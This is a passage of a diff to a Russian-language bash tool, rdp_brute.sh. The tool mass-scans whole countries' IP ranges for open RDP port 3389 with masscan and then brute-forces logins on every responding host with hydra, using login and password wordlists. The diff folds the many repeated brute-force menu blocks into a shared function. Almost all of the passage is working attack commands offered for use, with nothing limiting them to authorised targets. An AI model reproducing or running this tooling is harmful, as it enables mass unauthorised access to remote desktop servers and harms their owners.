-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "10" ]; then
@@ -1072,6 +649,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -1081,53 +659,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "11" ]; then
@@ -1144,6 +676,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -1153,53 +686,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "12" ]; then
@@ -1216,6 +703,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -1225,53 +713,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -1289,6 +731,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -1298,53 +741,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -1362,6 +759,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -1371,53 +769,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -1435,6 +787,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -1444,53 +797,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -1508,6 +815,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -1517,53 +825,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -1581,6 +843,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -1590,53 +853,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -1654,6 +871,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -1663,53 +881,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -1727,6 +899,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -1736,53 +909,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -1800,6 +927,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -1809,53 +937,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -1873,6 +955,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -1882,53 +965,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "22" ]; then
@@ -1945,6 +982,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -1954,53 +992,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "23" ]; then
@@ -2017,6 +1009,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -2026,53 +1019,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
